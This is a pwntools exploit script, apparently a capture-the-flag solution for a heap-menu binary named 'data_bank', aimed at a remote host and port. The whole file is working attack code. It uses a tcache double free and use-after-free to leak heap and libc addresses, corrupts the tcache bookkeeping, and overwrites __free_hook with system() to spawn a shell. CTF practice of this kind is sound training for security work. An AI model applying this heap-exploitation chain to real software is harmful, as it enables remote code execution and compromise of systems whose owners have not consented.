from pwn import *

libc = ELF('./libc.so.6')
s = remote("35.200.202.92", 1337)
# s=process('./data_bank',env={'LD_PRELOAD' : './libc.so.6'})


def add(idx, size, data):
    s.recvuntil(">> ")
    s.sendline(str(1))
    s.recvuntil("Enter the index:\n")
    s.sendline(str(idx))
    s.recvuntil("Enter the size:\n")
    s.sendline(str(size))
    s.recvuntil("Enter data:\n")
    s.sendline(str(data))


def edit(idx, data):
    s.recvuntil(">> ")
    s.sendline(str(2))
    s.recvuntil("Enter the index:\n")
    s.sendline(str(idx))
    s.recvuntil("Please update the data:\n")
    s.sendline(str(data))


def remove(idx):
    s.recvuntil(">> ")
    s.sendline(str(3))
    s.recvuntil("Enter the index:\n")
    s.sendline(str(idx))


def view(idx):
    s.recvuntil(">> ")
    s.sendline(str(4))
    s.recvuntil("Enter the index:\n")
    s.sendline(str(idx))


add(0, 0x250, "aa")
remove(0)
remove(0)
view(0)
s.recvuntil("Your data :")
heap = u64(s.recvuntil('\n')[:-1].ljust(8, '\x00'))-0x260
log.info("HEAP BASE = " + hex(heap))
edit(0, p64(heap+0x10))
add(1, 0x250, "aa")
add(2, 0x250, "\x00"*0x24 + "\x07")
add(3, 0x300, "a"*8)
remove(1)
view(0)
s.recvuntil("Your data :")
libc_base = u64(s.recvuntil('\n')[:-1].ljust(8, '\x00'))-0x3ebca0
log.info("LIBC BASE = " + hex(libc_base))
remove(3)
edit(2, "\x00"*0x24 + "\x07" + "a"*10 + "\x02")
edit(3, p64(libc_base+libc.symbols['__free_hook']))
add(4, 0x300, "/bin/sh")
add(5, 0x300, p64(libc_base+libc.symbols['system']))
remove(4)

s.interactive()
